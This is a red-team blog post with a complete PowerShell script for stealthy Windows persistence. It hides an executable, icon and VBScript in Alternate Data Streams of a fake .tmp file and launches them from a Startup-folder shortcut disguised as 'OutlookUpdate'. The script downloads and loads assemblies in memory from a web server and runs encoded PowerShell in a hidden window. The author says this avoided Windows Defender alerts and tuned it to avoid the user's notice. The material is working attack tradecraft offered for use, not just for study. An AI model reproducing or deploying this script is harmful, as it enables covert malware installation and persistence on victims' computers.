---
layout: post
title: Persistence using Startup Folder II - Using Alternate Data Streams
excerpt_separator: <!--more-->
---

Following the previous post where we used a shortcut in the Startup Folder to execute files with the hidden attribute, I did some tests using Alternate Data Streams to store all payloads inside a seemingly benign file.

<!--more-->


Gist: 

- [Script to create files](https://gist.github.com/ricardojoserf/0b12b07218b232a261f8631a90c79f1a)

<br>

-------------------------------------------


## Previous work

In the [last post](https://ricardojoserf.github.io/startupfolder/) we found it is possible to create a shortcut in the Startup Folder, with:

- A custom icon for the shortcut, for which we download an icon which is stored with the "hidden" attribute

- A VBScript, which is generated during the script execution with the "hidden" attribute and is used to call the executable file

- An executable file which we download and store with the "hidden" attribute

The file executes without any window popping at any moment and no alerts generated by Windows Defender, which looked good enough.

However, if the user has set the options to view hidden files in File Explorer, the files would be visible and (most probably) raise an alarm. 


<br>


## Using Alternate Data Streams

After giving it some thought, storing all payload files (icon, VBScript and executable files) inside a fourth file was feasible, and I thought of two options:

- Extended Attributes - Related to this topic I coded [SharpEA](https://github.com/ricardojoserf/SharpEA) some months ago.

- Alternate Data Streams - Related to this topic I coded [SharpADS](https://github.com/ricardojoserf/SharpADS) also some months ago.


Both look promising choices, but for now I only used Alternate Data Streams. The main reason is that I found this great gist:

- [api0cradle - Execute from Alternate Data Streams](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)

So let's see how we can achieve this: creating a bening temporary file (".tmp") in a non-administrative user's temporary folder and create 3 Alternate Data Streams to store in each of them the icon, VBScript and executable files. 


<br>

## Creating the code

The code is quite straightforward but I would like to explain some parts of it.

#### Directory and file variables

The file will be created with the value of the hostname variable and with the extension ".tmp". This is because it will be stored in the user's temporary folder, where there are many files with the same extension:

```powershell
$Dir = "$($env:USERPROFILE)\Appdata\Local\temp"
$File = "$($env:COMPUTERNAME).tmp"
```

####  Load SharpADS assembly in memory

To make the process simpler I used SharpADS, which can be loaded in memory because it is coded in C#, but you can just use Powershell. To load the file in memory you can use:

```powershell
$bytes = (New-Object System.Net.WebClient).DownloadData("$Url/$SharpADS")
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')
$entryPointMethod.Invoke($null, (, [string[]] ('clear', "$Dir\$File")))
```

Next, you can use it to create an Alternate Data Stream which in this case will contain the bytes of the icon file:

```powershell
$entryPointMethod.Invoke($null, (, [string[]] ('write', "$Dir\$File","$ADSico","$Url/$IcoFile")))
```

The script repeats the same code to store the VBScript and executable files in two other Alternate Data Streams.



#### Shortcut's TargetPath and Arguments

The parameters TargetPath and Arguments in the shortcut file define what is executed when it is clicked or in this case when Windows starts up. In last post, TargetPath value was the VBScript and Arguments was not used, which allowed to execute everything without any window popping up. 

However, it is not possible to use this approach this time. If you use the VBScript ADS value of the VBScript as TargetPath, the shortcut opens the file itself, in this case the ".tmp" file. Using other words, the $DATA Alternate Data Stream is opened by the shortcut file instead of the Alternate Data Stream where the VBScript is stored.

This is where api0cradle's gist saves the day. We find there are some alternatives to execute a payload in an ADS, the first one is executing the executable file directly using WMI: 

```
wmic process call create C:\path\file.tmp:ADS.exe
```
Translated to the Powershell shortcut creation, we would set the following values in a shortcut object $Shortcut: 

```powershell
$Shortcut.TargetPath = "wmic"
$Shortcut.Arguments = "process call create $Dir\$File`:$ADSexe"
```

This works but there is a window popping up which looks suspicious. It can be improved if the parameter "/output:CLIPBOARD" is added:

```powershell
$Shortcut.TargetPath = "wmic"
$Shortcut.Arguments = "/output:CLIPBOARD process call create $Dir\$File`:$ADSexe"
```

After many tests, the best alternative I found (for now) is using again the VBScript, but this time calling it with cscript in TargetPath and the file in the Arguments parameter:

```powershell
$Shortcut.TargetPath = "cscript"
$Shortcut.Arguments = "$Dir\$File`:$ADSvbs"
```

A window pops up... but it is only a flash. It is not perfect but this was just a test so... eh... good enough :)

<br>

## Files needed in the web server

From what we explained, the web server must host:

- SharpADS.exe file, which you can find pre-compiled in [here](https://github.com/ricardojoserf/SharpADS/releases/tag/v1.0)

- The icon file. For example: "microsoft-outlook.ico"

- The executable file. For example: "calc.exe"

The shortcut and VBScript files are created by the script.


<br>

## Final script

This process is automated in the following [script](https://gist.github.com/ricardojoserf/0b12b07218b232a261f8631a90c79f1a):

```powershell
$Dir = "$($env:USERPROFILE)\Appdata\Local\temp"
$File = "$($env:COMPUTERNAME).tmp"
$ExeFile = "calc.exe"
$Url = "http://127.0.0.1:80"
$IcoFile = "microsoft-outlook.ico"
$SharpADS = "SharpADS.exe"
$ADSexe = "ADS.exe"
$ADSico = "ADS.ico"
$ADSvbs = "ADS.vbs"
$LnkFile = "OutlookUpdate.lnk"

## Create .TMP file
cmd /c "echo Updating file... [OK] > ""$Dir\$File"""

## Load SharpADS in memory
$bytes = (New-Object System.Net.WebClient).DownloadData("$Url/$SharpADS")
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')
$entryPointMethod.Invoke($null, (, [string[]] ('clear', "$Dir\$File")))

## Save .ICON as ADS
$entryPointMethod.Invoke($null, (, [string[]] ('write', "$Dir\$File","$ADSico","$Url/$IcoFile")))

## Save .EXE as ADS
$entryPointMethod.Invoke($null, (, [string[]] ('write', "$Dir\$File","$ADSexe","$Url/$ExeFile")))

## VBS as ADS
$B64Path = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("wmic process call create '""$Dir\$File`:$ADSexe""'"))
$VBScontent = "Const HIDDEN_WINDOW = 0 `nstrComputer = ""."" `nSet objWMIService = GetObject(""winmgmts:"" & ""{impersonationLevel=impersonate}!\\"" & strComputer & ""\root\cimv2"") `nSet objStartup = objWMIService.Get(""Win32_ProcessStartup"") `nSet objConfig = objStartup.SpawnInstance_ `nobjConfig.ShowWindow = HIDDEN_WINDOW `nSet objProcess = GetObject(""winmgmts:root\cimv2:Win32_Process"") `nerrReturn = objProcess.Create( ""powershell -e $B64Path"", null, objConfig, intProcessID)"
$entryPointMethod.Invoke($null, (, [string[]] ('write', "$Dir\$File","$ADSvbs",$VBScontent)))

## Create .LNK
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$($env:USERPROFILE)\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\$LnkFile")
### Shortcut will execute cscript $Dir\$File:ADS.vbs
$Shortcut.TargetPath = "cscript"
$Shortcut.Arguments = "$Dir\$File`:$ADSvbs"
#### $Shortcut.TargetPath = "wmic"
#### $Shortcut.Arguments = "process call create $Dir\$File`:$ADSexe"
$Shortcut.IconLocation = "$Dir\$File`:$ADSico"
$Shortcut.Save()

## Check file and ADS values
echo "File created in path $Dir\$File"
Get-Item -Stream * $Dir\$File | select Stream,Length
```

<br>